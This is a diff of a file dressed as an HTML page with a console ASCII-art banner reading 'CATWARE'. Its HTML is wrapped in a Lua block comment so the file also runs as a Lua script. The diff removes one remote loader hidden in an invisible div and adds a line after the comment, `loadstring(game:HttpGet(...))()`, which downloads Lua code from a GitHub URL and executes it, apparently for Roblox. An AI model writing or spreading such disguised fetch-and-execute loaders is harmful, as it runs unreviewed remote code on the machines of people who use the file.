@@ -1,4 +1,5 @@
---[[<!DOCTYPE html>
+--[[
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -35,8 +36,6 @@
         .message { font-size: 16px; color: #bbbbbb; margin-bottom: 25px; line-height: 1.5; }
         .home-btn { display: inline-block; text-decoration: none; color: #00aaff; font-weight: 600; font-size: 14px; transition: color 0.2s ease; }
         .home-btn:hover { color: #55c4ff; }
-        /* Hides raw text from browser view */
-        .hidden-payload { display: none !important; }
     </style>
 </head>
 <body>
@@ -51,9 +50,8 @@
         const asciiArt = `-- [[ ██████╗\n    ██╔════╝\n    ██║\n    ██║\n     ██████╗\n\n     █████╗\n    ██╔══██╗\n    ███████║\n    ██╔══██║\n    ██║  ██║\n\n    ████████╗\n    ╚══██╔══╝\n       ██║\n       ██║\n       ██║\n\n    ██╗    ██╗\n    ██║    ██║\n    ██║ █╗ ██║\n    ██║███╗██║\n    ╚███╔███╔╝\n\n     █████╗\n    ██╔══██╗\n    ███████║\n    ██╔══██║\n    ██║  ██║\n\n    ██████╗\n    ██╔══██╗\n    ██████╔╝\n    ██╔══██╗\n    ██║  ██║\n\n    ███████╗\n    ██╔════╝\n    █████╗\n    ██╔══╝\n    ███████╗\n  ]]`;
         for (let i = 1; i <= 100; i++) console.log(`[#${i}]\n` + asciiArt);
     </script>
-    <div class="hidden-payload">
-]]
-loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))()
-    </div>
 </body>
 </html>
+]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sz1o/4ish/refs/heads/main/main.lua"))()
